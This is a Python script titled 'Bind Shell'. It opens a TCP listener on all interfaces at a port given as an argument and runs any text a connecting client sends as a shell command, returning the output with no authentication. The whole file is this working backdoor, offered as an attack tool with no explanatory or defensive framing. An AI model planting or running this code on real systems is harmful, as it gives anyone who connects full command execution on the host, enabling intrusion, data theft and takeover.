#!/usr/bin/python3
# Bind Shell

from subprocess import Popen, PIPE
import atexit
import select
import socket
import sys
import os

if len(sys.argv) != 2:
	print('[-] Usage: bind_shell.py <PORT>')
	exit()

host = '0.0.0.0'
port = int(sys.argv[1])

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(2)
atexit.register(server.close)

s_in = [server, sys.stdin]				# Server Input
size = 1024
username = os.environ.get('USERNAME')

while True:
	# File Descriptors:
	fd_in, fd_out, fd_err = select.select(s_in, [], [])
	for s in fd_in:
		if s == server:
			client, address = server.accept()
			s_in.append(client)
		else:
			data = s.recv(size)
			if data:
				proc = Popen(data, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
				stdout_value = proc.stdout.read() + proc.stderr.read()
				s.send(stdout_value)
			else:
				s.close()
				s_in.remove(s)

server.close()
